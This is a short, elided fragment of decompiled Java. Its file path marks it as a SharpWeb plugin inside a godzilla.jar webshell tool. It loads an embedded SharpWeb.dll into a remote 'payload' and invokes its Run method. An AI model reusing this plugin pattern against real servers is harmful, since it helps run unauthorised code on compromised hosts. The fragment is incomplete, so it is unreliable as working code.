...
/*  61 */             SharpWeb.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
...
/*     */       try {
/*  71 */         InputStream inputStream = getClass().getResourceAsStream("assets/SharpWeb.dll");
/*  72 */         byte[] data = functions.readInputStream(inputStream);
/*  73 */         inputStream.close();
/*  74 */         if (this.payload.include("SharpWeb.Run", data)) {
...
/*  90 */     byte[] result = this.payload.evalFunc("SharpWeb.Run", "run", new ReqParameter());
...
/* Location:              /Users/h12/Documents/网安工具/gesila/godzilla.jar!/shells/plugins/cshap/SharpWeb.class
